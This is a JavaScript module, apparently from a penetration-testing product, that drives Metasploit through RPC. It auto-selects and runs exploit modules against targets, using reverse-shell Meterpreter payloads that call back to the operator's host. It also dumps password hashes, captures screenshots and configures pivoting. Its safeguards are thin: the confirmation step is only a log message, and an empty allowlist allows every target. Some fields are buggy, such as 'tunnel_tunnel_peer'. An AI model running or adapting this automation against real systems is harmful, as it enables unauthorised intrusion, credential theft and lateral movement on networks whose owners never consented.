/**
 * ============================================================================
 * SECURITYSCAN PRO - MÓDULO METASPLOIT INTEGRATION SEGURO
 * ============================================================================
 * Integración completa con Metasploit Framework v6.4+ via RPC API
 * 
 * CORRECCIONES DE SEGURIDAD APLICADAS:
 * - Generación de credenciales con crypto.randomBytes()
 * - Uso de spawn() en lugar de exec() para RPC calls
 * - Sanitización de parámetros de entrada
 * - Timeout estricto en todas las operaciones
 * - Sin exposición de credenciales en logs
 * - npm install crypto  # Built-in, pero verificar disponibilidad
 * ============================================================================
 */

const { spawn } = require('child_process');
const util = require('util');
const fs = require('fs');
const path = require('path');
const net = require('net');
const crypto = require('crypto');
const Logger = require('../utils/logger');

class MetasploitIntegration {
  /**
   * Rankings de exploits Metasploit
   */
  static EXPLOIT_RANKINGS = {
    EXCELLENT: { value: 'excellent', score: 100, reliability: 'The exploit will never crash the service' },
    GREAT: { value: 'great', score: 90, reliability: 'Default target with auto-detection or version check' },
    GOOD: { value: 'good', score: 80, reliability: 'Default target is the common case' },
    NORMAL: { value: 'normal', score: 70, reliability: 'Reliable but depends on specific version' },
    AVERAGE: { value: 'average', score: 50, reliability: 'Generally unreliable or difficult to exploit' },
    LOW: { value: 'low', score: 30, reliability: 'Nearly impossible to exploit (<50% success)' },
    MANUAL: { value: 'manual', score: 10, reliability: 'Unstable, difficult, or DoS only' }
  };

  /**
   * Tipos de módulos soportados
   */
  static MODULE_TYPES = {
    EXPLOIT: 'exploit',
    AUXILIARY: 'auxiliary',
    POST: 'post',
    PAYLOAD: 'payload',
    ENCODER: 'encoder',
    NOP: 'nop',
    EVASION: 'evasion'
  };

  /**
   * Tipos de sesiones
   */
  static SESSION_TYPES = {
    METERPRETER: 'meterpreter',
    SHELL: 'shell',
    CMD: 'cmd'
  };

  /**
   * Configuración por defecto
   */
  static get DEFAULT_CONFIG() {
    // Generar credenciales seguras automáticamente
    const securePassword = crypto.randomBytes(32).toString('hex');
    
    return {
      // Conexión RPC
      rpc: {
        host: '127.0.0.1',
        port: 55553,
        uri: '/api/',
        ssl: true,
        username: 'msf',
        password: securePassword, // CRÍTICO: Generado con crypto.randomBytes
        token: null
      },

      // Workspace y base de datos
      workspace: {
        name: 'SecureScan',
        description: 'Automated penetration testing workspace',
        createIfNotExists: true
      },

      // Opciones de exploitación
      exploitation: {
        dryRun: true,
        autoExploit: false,
        minRanking: 'good',
        confirmBeforeExploit: true,
        maxAttempts: 3,
        timeout: 300,
        defaultPayload: 'generic/shell_reverse_tcp',
        fallbackPayloads: [
          'generic/shell_reverse_tcp',
          'generic/shell_bind_tcp',
          'linux/x86/meterpreter/reverse_tcp',
          'windows/x64/meterpreter/reverse_tcp'
        ]
      },

      // Post-explotación
      postExploitation: {
        enabled: false,
        autoRun: false,
        modules: [
          'post/multi/gather/enum_system',
          'post/multi/gather/env',
          'post/multi/manage/autoroute'
        ],
        pivoting: false,
        lootCollection: true,
        screenshot: false,
        keylogger: false
      },

      // Logging y auditoría
      audit: {
        logAllCommands: true,
        saveSessions: true,
        outputDir: './metasploit_logs',
        screenshotDir: './metasploit_screenshots'
      },

      // Seguridad y límites
      safety: {
        allowedTargets: [],
        blockedTargets: [],
        maxSessions: 5,
        requireConfirmation: true
      }
    };
  }

  /**
   * Constructor
   */
  constructor(config = {}) {
    this.config = { ...MetasploitIntegration.DEFAULT_CONFIG, ...config };
    this.rpcClient = null;
    this.authenticated = false;
    this.sessions = new Map();
    this.workspaces = new Set();
    this.activeExploits = new Map();
    this.msfrpcdProcess = null;
  }

  /**
   * Sanitizar input para prevenir inyección
   * @private
   */
  _sanitizeInput(input) {
    if (typeof input !== 'string') {
      throw new Error('Input must be a string');
    }
    // Permitir solo caracteres alfanuméricos, guiones, puntos y slashes
    const sanitized = input.replace(/[^a-zA-Z0-9._\-\/]/g, '');
    if (sanitized !== input) {
      Logger.warn(`[METASPLOIT] Input sanitizado: "${input}" -> "${sanitized}"`);
    }
    return sanitized;
  }

  /**
   * Validar que un target esté permitido
   * @private
   */
  _isTargetAllowed(target) {
    const { allowedTargets, blockedTargets } = this.config.safety;
    
    // Verificar blacklist primero
    if (blockedTargets.some(t => this._matchesTarget(t, target))) {
      return false;
    }
    
    // Si hay whitelist, target debe estar en ella
    if (allowedTargets.length > 0) {
      return allowedTargets.some(t => this._matchesTarget(t, target));
    }
    
    return true;
  }

  /**
   * Comparar target contra patrón
   * @private
   */
  _matchesTarget(pattern, target) {
    if (pattern === target) return true;
    try {
      const regex = new RegExp(pattern);
      return regex.test(target);
    } catch {
      return false;
    }
  }

  /**
   * Generar password seguro (CRÍTICO: reemplaza Math.random)
   * @private
   */
  _generateSecurePassword() {
    return crypto.randomBytes(32).toString('hex');
  }

  /**
   * Ejecutar comando RPC de forma segura usando spawn
   * @private
   */
  _executeRpcCommand(method, params = []) {
    return new Promise((resolve, reject) => {
      const { host, port, ssl, username, password, token } = this.config.rpc;
      const protocol = ssl ? 'https' : 'http';
      const url = `${protocol}://${host}:${port}${this.config.rpc.uri}`;
      
      // Construir headers de autenticación
      const authHeader = token 
        ? `Authorization: Bearer ${token}`
        : '';
      
      // Preparar datos POST de forma segura
      const postData = new URLSearchParams({
        method: method,
        params: JSON.stringify(params)
      }).toString();

      // Usar spawn en lugar de exec para evitar RCE
      const curlArgs = [
        '-s', // Silent
        '-X', 'POST',
        '--max-time', '30',
        '--connect-timeout', '10',
        '-H', 'Content-Type: application/x-www-form-urlencoded',
        ...(authHeader ? ['-H', authHeader] : []),
        '-d', postData,
        url
      ];

      // Log seguro: no incluir credenciales
      Logger.info(`[METASPLOIT] RPC Call: ${method} (params: ${params.length})`);

      const curl = spawn('curl', curlArgs, {
        timeout: 35000, // 30s max-time + buffer
        killSignal: 'SIGTERM'
      });

      let stdout = '';
      let stderr = '';

      curl.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      curl.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      curl.on('close', (code) => {
        if (code !== 0) {
          reject(new Error(`curl exited with code ${code}: ${stderr}`));
          return;
        }
        
        try {
          const result = JSON.parse(stdout);
          if (result.error) {
            reject(new Error(`RPC Error: ${result.error}`));
          } else {
            resolve(result.result || result);
          }
        } catch (error) {
          reject(new Error(`Failed to parse RPC response: ${error.message}`));
        }
      });

      curl.on('error', (error) => {
        reject(new Error(`Failed to execute curl: ${error.message}`));
      });
    });
  }

  /**
   * Inicializar conexión RPC con Metasploit
   */
  async initialize() {
    Logger.info('[METASPLOIT] Inicializando integración con Metasploit Framework');

    try {
      // Verificar que msfrpcd está corriendo
      await this._checkRPCConnection();

      // Autenticar
      await this._authenticate();

      // Configurar workspace
      await this._setupWorkspace();

      // Verificar capacidades
      const capabilities = await this._getCapabilities();

      Logger.info(`[METASPLOIT] Conectado - Version: ${capabilities.version}`);

      return {
        connected: true,
        version: capabilities.version,
        workspace: this.config.workspace.name,
        capabilities
      };

    } catch (error) {
      Logger.error('[METASPLOIT] Error de inicialización:', error);
      
      // Intentar iniciar msfrpcd automáticamente
      if (error.message.includes('Connection refused')) {
        Logger.info('[METASPLOIT] Intentando iniciar msfrpcd...');
        await this._startRPCDaemon();
        return this.initialize();
      }
      
      throw error;
    }
  }

  /**
   * Verificar conexión RPC
   * @private
   */
  _checkRPCConnection() {
    return new Promise((resolve, reject) => {
      const socket = new net.Socket();
      
      socket.setTimeout(5000);
      
      socket.on('connect', () => {
        socket.destroy();
        resolve(true);
      });
      
      socket.on('error', (err) => {
        reject(new Error(`No se puede conectar a msfrpcd en ${this.config.rpc.host}:${this.config.rpc.port}`));
      });
      
      socket.on('timeout', () => {
        socket.destroy();
        reject(new Error('Timeout conectando a msfrpcd'));
      });
      
      socket.connect(this.config.rpc.port, this.config.rpc.host);
    });
  }

  /**
   * Iniciar daemon RPC si no está corriendo
   * @private
   */
  async _startRPCDaemon() {
    // Generar password seguro si no existe
    if (!this.config.rpc.password) {
      this.config.rpc.password = this._generateSecurePassword();
    }

    Logger.info('[METASPLOIT] Iniciando msfrpcd...');

    try {
      // Verificar que msfrpcd existe
      await new Promise((resolve, reject) => {
        const check = spawn('which', ['msfrpcd']);
        check.on('close', (code) => {
          if (code === 0) resolve();
          else reject(new Error('msfrpcd no encontrado. Instalar Metasploit Framework'));
        });
      });

      // Iniciar msfrpcd con spawn (no exec)
      const msfrpcdArgs = [
        '-U', this.config.rpc.username,
        '-P', this.config.rpc.password,
        '-a', this.config.rpc.host,
        '-p', this.config.rpc.port.toString(),
        '-S', this.config.rpc.ssl ? 'true' : 'false',
        '-f' // Foreground
      ];

      // Log seguro: mask password
      const logArgs = msfrpcdArgs.map((arg, idx) => 
        (idx === 3) ? '[REDACTED]' : arg
      );
      Logger.info(`[METASPLOIT] msfrpcd args: ${logArgs.join(' ')}`);

      this.msfrpcdProcess = spawn('msfrpcd', msfrpcdArgs, {
        detached: false,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      // Manejar logs de msfrpcd
      this.msfrpcdProcess.stdout.on('data', (data) => {
        Logger.debug(`[msfrpcd] ${data.toString().trim()}`);
      });

      this.msfrpcdProcess.stderr.on('data', (data) => {
        Logger.warn(`[msfrpcd] ${data.toString().trim()}`);
      });

      this.msfrpcdProcess.on('exit', (code) => {
        Logger.warn(`[METASPLOIT] msfrpcd exited with code ${code}`);
        this.msfrpcdProcess = null;
      });

      // Esperar a que inicie
      await new Promise(resolve => setTimeout(resolve, 5000));

      Logger.info('[METASPLOIT] msfrpcd iniciado correctamente');
      return true;

    } catch (error) {
      Logger.error('[METASPLOIT] Error iniciando msfrpcd:', error);
      throw error;
    }
  }

  /**
   * Autenticar con RPC API
   * @private
   */
  async _authenticate() {
    try {
      const result = await this._executeRpcCommand('auth.login', [
        this.config.rpc.username,
        this.config.rpc.password
      ]);

      if (result && result.token) {
        this.config.rpc.token = result.token;
        this.authenticated = true;
        Logger.info('[METASPLOIT] Autenticación exitosa');
        return true;
      }

      throw new Error('Autenticación fallida - token no recibido');

    } catch (error) {
      Logger.error('[METASPLOIT] Error de autenticación:', error);
      throw error;
    }
  }

  /**
   * Configurar workspace
   * @private
   */
  async _setupWorkspace() {
    const { name, description, createIfNotExists } = this.config.workspace;

    try {
      // Listar workspaces existentes
      const workspaces = await this._executeRpcCommand('db.workspaces', []);
      
      const exists = Array.isArray(workspaces) && workspaces.some(w => w.name === name);

      if (!exists && createIfNotExists) {
        await this._executeRpcCommand('db.add_workspace', [name]);
        Logger.info(`[METASPLOIT] Workspace creado: ${name}`);
      } else if (exists) {
        Logger.info(`[METASPLOIT] Usando workspace existente: ${name}`);
      }

      // Establecer como workspace actual
      await this._executeRpcCommand('db.set_workspace', [name]);
      this.workspaces.add(name);

      return true;

    } catch (error) {
      Logger.warn('[METASPLOIT] Error configurando workspace:', error.message);
      return false;
    }
  }

  /**
   * Obtener capacidades del framework
   * @private
   */
  async _getCapabilities() {
    try {
      const version = await this._executeRpcCommand('core.version', []);
      const modules = await this._executeRpcCommand('module.stats', []);
      
      return {
        version: version?.version || 'unknown',
        ruby_version: version?.ruby_version,
        api_version: version?.api_version,
        moduleCount: modules?.exploit || 0,
        exploitCount: modules?.exploit || 0,
        auxiliaryCount: modules?.auxiliary || 0,
        postCount: modules?.post || 0,
        payloadCount: modules?.payload || 0
      };
    } catch (error) {
      return { version: 'unknown', moduleCount: 0 };
    }
  }

  /**
   * Importar resultados de Nmap a Metasploit
   */
  async importNmapResults(nmapXmlFile) {
    // Validar path
    const sanitizedPath = this._sanitizeInput(nmapXmlFile);
    
    if (!fs.existsSync(sanitizedPath)) {
      throw new Error(`Archivo Nmap XML no encontrado: ${sanitizedPath}`);
    }

    // Verificar que sea un archivo dentro del directorio permitido
    const resolvedPath = path.resolve(sanitizedPath);
    const allowedDir = path.resolve(process.cwd(), 'outputs');
    if (!resolvedPath.startsWith(allowedDir)) {
      throw new Error('Path traversal detectado: archivo fuera de directorio permitido');
    }

    Logger.info(`[METASPLOIT] Importando resultados Nmap: ${sanitizedPath}`);

    try {
      const xmlData = fs.readFileSync(sanitizedPath, 'utf8');
      
      const result = await this._executeRpcCommand('db.import_data', [{
        workspace: this.config.workspace.name,
        data: xmlData,
        format: 'nmap'
      }]);

      Logger.info('[METASPLOIT] Importación completada');
      
      // Obtener hosts importados
      const hosts = await this._executeRpcCommand('db.hosts', [{
        workspace: this.config.workspace.name
      }]);

      return {
        success: true,
        hostsImported: Array.isArray(hosts) ? hosts.length : 0,
        hosts: Array.isArray(hosts) ? hosts.map(h => ({
          address: h.address,
          os: h.os_name,
          services: h.services?.length || 0
        })) : []
      };

    } catch (error) {
      Logger.error('[METASPLOIT] Error importando Nmap:', error);
      throw error;
    }
  }

  /**
   * Buscar módulos relevantes para un servicio
   */
  async findModulesForService(service, version = null, type = 'exploit') {
    // Sanitizar inputs
    const sanitizedService = this._sanitizeInput(service);
    const sanitizedVersion = version ? this._sanitizeInput(version) : null;
    
    const searchTerm = sanitizedVersion ? `${sanitizedService} ${sanitizedVersion}` : sanitizedService;
    
    Logger.info(`[METASPLOIT] Buscando módulos para: ${searchTerm}`);

    try {
      const modules = await this._executeRpcCommand('module.search', [searchTerm]);
      
      if (!Array.isArray(modules)) {
        return [];
      }

      // Filtrar por tipo y ranking
      const filtered = modules.filter(m => {
        if (type && !m.type?.includes(type)) return false;
        
        const ranking = this._getRankingScore(m.rank);
        const minRanking = this._getRankingScore(this.config.exploitation.minRanking);
        
        return ranking >= minRanking;
      });

      return filtered.map(m => ({
        name: m.fullname,
        type: m.type,
        ranking: m.rank,
        rankingScore: this._getRankingScore(m.rank),
        description: m.description,
        disclosureDate: m.disclosuredate,
        references: m.references || []
      })).sort((a, b) => b.rankingScore - a.rankingScore);

    } catch (error) {
      Logger.error('[METASPLOIT] Error buscando módulos:', error);
      return [];
    }
  }

  /**
   * Ejecutar exploit contra target
   */
  async exploitTarget(target, moduleName, options = {}) {
    const { dryRun, confirmBeforeExploit, timeout } = this.config.exploitation;

    // Validar target
    if (!this._isTargetAllowed(target)) {
      throw new Error(`Target ${target} no está en la lista de permitidos`);
    }

    // Sanitizar moduleName
    const sanitizedModule = this._sanitizeInput(moduleName);

    Logger.info(`[METASPLOIT] Preparando exploit: ${sanitizedModule} contra ${target}`);

    // Modo dry-run: solo simular
    if (dryRun) {
      Logger.info('[METASPLOIT] MODO DRY-RUN: No se ejecutará el exploit real');
      return this._simulateExploit(target, sanitizedModule, options);
    }

    // Confirmación manual si es requerida
    if (confirmBeforeExploit) {
      Logger.warn('[METASPLOIT] Se requiere confirmación manual para ejecutar exploit');
      // En implementación real, esto requeriría interacción del usuario
    }

    try {
      // Configurar opciones del exploit
      const exploitOptions = {
        RHOSTS: target,
        PAYLOAD: options.payload || this.config.exploitation.defaultPayload,
        LHOST: options.lhost || await this._getLHOST(),
        LPORT: options.lport || this._getRandomPort(),
        ...options.moduleOptions
      };

      // Ejecutar exploit via RPC
      const result = await this._executeRpcCommand('module.execute', [
        'exploit',
        sanitizedModule,
        exploitOptions
      ]);

      const jobId = result?.job_id;

      Logger.info(`[METASPLOIT] Exploit iniciado - Job ID: ${jobId}`);

      // Esperar resultado
      const session = await this._waitForSession(jobId, timeout);

      if (session) {
        this.sessions.set(session.id, {
          ...session,
          target,
          module: sanitizedModule,
          timestamp: new Date().toISOString()
        });

        // Ejecutar post-explotación si está habilitada
        if (this.config.postExploitation.enabled && this.config.postExploitation.autoRun) {
          await this.runPostExploitation(session.id);
        }

        return {
          success: true,
          sessionId: session.id,
          sessionType: session.type,
          target,
          module: sanitizedModule,
          timestamp: new Date().toISOString()
        };
      }

      return {
        success: false,
        error: 'No se obtuvo sesión',
        jobId
      };

    } catch (error) {
      Logger.error('[METASPLOIT] Error en exploit:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * Ejecutar módulo auxiliar
   */
  async runAuxiliary(moduleName, options = {}) {
    const sanitizedModule = this._sanitizeInput(moduleName);
    
    Logger.info(`[METASPLOIT] Ejecutando auxiliar: ${sanitizedModule}`);

    try {
      const result = await this._executeRpcCommand('module.execute', [
        'auxiliary',
        sanitizedModule,
        options
      ]);

      return {
        success: true,
        jobId: result?.job_id,
        result
      };

    } catch (error) {
      Logger.error('[METASPLOIT] Error en auxiliar:', error);
      throw error;
    }
  }

  /**
   * Ejecutar post-explotación
   */
  async runPostExploitation(sessionId, modules = null) {
    // Sanitizar sessionId
    const sanitizedSessionId = this._sanitizeInput(sessionId);
    
    const postModules = modules || this.config.postExploitation.modules;
    
    Logger.info(`[METASPLOIT] Ejecutando post-explotación en sesión ${sanitizedSessionId}`);

    const results = [];

    for (const moduleName of postModules) {
      const sanitizedModule = this._sanitizeInput(moduleName);
      
      try {
        Logger.info(`[METASPLOIT] Post-module: ${sanitizedModule}`);
        
        const result = await this._executeRpcCommand('module.execute', [
          'post',
          sanitizedModule,
          { SESSION: sanitizedSessionId }
        ]);

        results.push({
          module: sanitizedModule,
          success: true,
          result
        });

        // Si es pivoting, configurar rutas
        if (sanitizedModule.includes('autoroute') && this.config.postExploitation.pivoting) {
          await this._configurePivoting(sanitizedSessionId);
        }

      } catch (error) {
        results.push({
          module: sanitizedModule,
          success: false,
          error: error.message
        });
      }
    }

    return results;
  }

  /**
   * Configurar pivoting
   * @private
   */
  async _configurePivoting(sessionId) {
    Logger.info(`[METASPLOIT] Configurando pivoting para sesión ${sessionId}`);

    try {
      const networks = await this._executeRpcCommand('session.meterpreter_run_single', [
        sessionId,
        'run autoroute -s'
      ]);
      
      return { success: true, networks };
    } catch (error) {
      Logger.warn('[METASPLOIT] Error configurando pivoting:', error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Ejecutar comando en sesión Meterpreter
   */
  async runMeterpreterCommand(sessionId, command) {
    const sanitizedSessionId = this._sanitizeInput(sessionId);
    // No sanitizamos command completamente porque necesita ser un comando válido de meterpreter
    // pero validamos que no contenga caracteres peligrosos
    if (/[;&|]/.test(command)) {
      throw new Error('Command contains dangerous characters');
    }
    
    try {
      const result = await this._executeRpcCommand('session.meterpreter_run_single', [
        sanitizedSessionId,
        command
      ]);

      return {
        success: true,
        output: result?.result || result
      };

    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * Recolectar evidencia de sesión
   */
  async collectLoot(sessionId) {
    const sanitizedSessionId = this._sanitizeInput(sessionId);
    
    Logger.info(`[METASPLOIT] Recolectando evidencia de sesión ${sanitizedSessionId}`);

    const loot = {
      systemInfo: null,
      hashes: null,
      credentials: null,
      files: [],
      screenshot: null,
      timestamp: new Date().toISOString()
    };

    try {
      loot.systemInfo = await this.runMeterpreterCommand(sanitizedSessionId, 'sysinfo');

      if (this.config.postExploitation.lootCollection) {
        try {
          loot.hashes = await this.runMeterpreterCommand(sanitizedSessionId, 'hashdump');
        } catch {
          // No siempre disponible
        }
      }

      if (this.config.postExploitation.screenshot) {
        try {
          const screenshotResult = await this.runMeterpreterCommand(sanitizedSessionId, 'screenshot');
          loot.screenshot = screenshotResult.output;
        } catch {
          // Ignorar errores de screenshot
        }
      }

      return loot;

    } catch (error) {
      Logger.error('[METASPLOIT] Error recolectando loot:', error);
      return loot;
    }
  }

  /**
   * Esperar sesión desde job de exploit
   * @private
   */
  async _waitForSession(jobId, timeout = 300) {
    const startTime = Date.now();
    const timeoutMs = timeout * 1000;

    while (Date.now() - startTime < timeoutMs) {
      try {
        const sessions = await this._executeRpcCommand('session.list', []);
        
        if (typeof sessions !== 'object' || sessions === null) {
          await new Promise(resolve => setTimeout(resolve, 5000));
          continue;
        }

        const sessionEntries = Object.entries(sessions);
        
        for (const [id, session] of sessionEntries) {
          if (!this.sessions.has(id)) {
            return {
              id,
              type: session.type,
              tunnel_local: session.tunnel_local,
              tunnel_peer: session.tunnel_tunnel_peer,
              via_exploit: session.via_exploit,
              desc: session.desc
            };
          }
        }

      } catch (error) {
        // Ignorar errores temporales
      }

      await new Promise(resolve => setTimeout(resolve, 5000));
    }

    return null; // Timeout
  }

  /**
   * Listar sesiones activas
   */
  async listSessions() {
    try {
      const sessions = await this._executeRpcCommand('session.list', []);
      
      if (typeof sessions !== 'object' || sessions === null) {
        return [];
      }

      return Object.entries(sessions).map(([id, session]) => ({
        id,
        type: session.type,
        target: session.session_host,
        exploit: session.via_exploit,
        payload: session.via_payload,
        opened: session.opened_at,
        lastActivity: session.last_activity
      }));

    } catch (error) {
      Logger.error('[METASPLOIT] Error listando sesiones:', error);
      return [];
    }
  }

  /**
   * Cerrar sesión
   */
  async closeSession(sessionId) {
    const sanitizedSessionId = this._sanitizeInput(sessionId);
    
    try {
      await this._executeRpcCommand('session.stop', [sanitizedSessionId]);
      this.sessions.delete(sanitizedSessionId);
      
      Logger.info(`[METASPLOIT] Sesión ${sanitizedSessionId} cerrada`);
      return true;

    } catch (error) {
      Logger.error(`[METASPLOIT] Error cerrando sesión ${sanitizedSessionId}:`, error);
      return false;
    }
  }

  /**
   * Auto-exploitación basada en findings
   */
  async autoExploitFromFindings(findings, options = {}) {
    const { minCvss, onlyRemote, dryRun } = options;
    
    Logger.info(`[METASPLOIT] Iniciando auto-exploitación de ${findings.length} findings`);

    const results = [];
    const candidates = findings.filter(f => {
      if (minCvss && f.cvss < minCvss) return false;
      if (onlyRemote && !f.isRemote) return false;
      return true;
    });

    for (const finding of candidates) {
      // Verificar límite de sesiones
      if (this.sessions.size >= this.config.safety.maxSessions) {
        Logger.warn('[METASPLOIT] Límite de sesiones alcanzado, deteniendo auto-exploit');
        break;
      }

      try {
        const modules = await this.findModulesForService(
          finding.service,
          finding.version,
          'exploit'
        );

        if (modules.length === 0) continue;

        const bestModule = modules[0];
        
        Logger.info(`[METASPLOIT] Auto-exploit: ${finding.target} -> ${bestModule.name}`);

        if (dryRun || this.config.exploitation.dryRun) {
          results.push({
            target: finding.target,
            module: bestModule.name,
            status: 'simulated',
            wouldExploit: true
          });
          continue;
        }

        const exploitResult = await this.exploitTarget(
          finding.target,
          bestModule.name,
          {
            payload: this._selectPayloadForTarget(finding.target),
            lhost: options.lhost
          }
        );

        results.push({
          target: finding.target,
          module: bestModule.name,
          status: exploitResult.success ? 'success' : 'failed',
          sessionId: exploitResult.sessionId,
          error: exploitResult.error
        });

      } catch (error) {
        results.push({
          target: finding.target,
          status: 'error',
          error: error.message
        });
      }
    }

    return results;
  }

  /**
   * Utilidades privadas
   * @private
   */
  _getRankingScore(ranking) {
    const rank = MetasploitIntegration.EXPLOIT_RANKINGS[ranking?.toUpperCase()];
    return rank ? rank.score : 0;
  }

  _getLHOST() {
    // Obtener IP local para LHOST
    const interfaces = require('os').networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) {
          return iface.address;
        }
      }
    }
    return '127.0.0.1';
  }

  _getRandomPort() {
    return Math.floor(Math.random() * (65535 - 1024) + 1024);
  }

  _selectPayloadForTarget(target) {
    if (target.includes('windows') || target.includes('win')) {
      return 'windows/x64/meterpreter/reverse_tcp';
    }
    if (target.includes('linux') || target.includes('lin')) {
      return 'linux/x86/meterpreter/reverse_tcp';
    }
    return this.config.exploitation.defaultPayload;
  }

  _simulateExploit(target, moduleName, options) {
    return {
      success: true,
      simulated: true,
      target,
      module: moduleName,
      options,
      message: 'Este es un resultado simulado (modo dry-run)',
      wouldHaveExecuted: true
    };
  }

  /**
   * Exportar reporte de actividad
   */
  exportReport(outputPath) {
    const sanitizedPath = this._sanitizeInput(outputPath);
    
    const report = {
      timestamp: new Date().toISOString(),
      workspace: this.config.workspace.name,
      sessions: Array.from(this.sessions.entries()),
      exploitsAttempted: this.activeExploits.size,
      config: {
        dryRun: this.config.exploitation.dryRun,
        minRanking: this.config.exploitation.minRanking
      }
    };

    fs.writeFileSync(sanitizedPath, JSON.stringify(report, null, 2));
    return report;
  }

  /**
   * Cerrar conexión y limpiar
   */
  async shutdown() {
    Logger.info('[METASPLOIT] Cerrando conexión...');

    // Cerrar sesiones activas
    for (const [id, session] of this.sessions) {
      await this.closeSession(id);
    }

    // Logout RPC
    if (this.authenticated) {
      try {
        await this._executeRpcCommand('auth.logout', []);
      } catch {
        // Ignorar errores de logout
      }
    }

    // Matinar proceso msfrpcd si lo iniciamos
    if (this.msfrpcdProcess) {
      this.msfrpcdProcess.kill('SIGTERM');
      this.msfrpcdProcess = null;
    }

    this.authenticated = false;
    this.sessions.clear();
  }
}

module.exports = MetasploitIntegration;
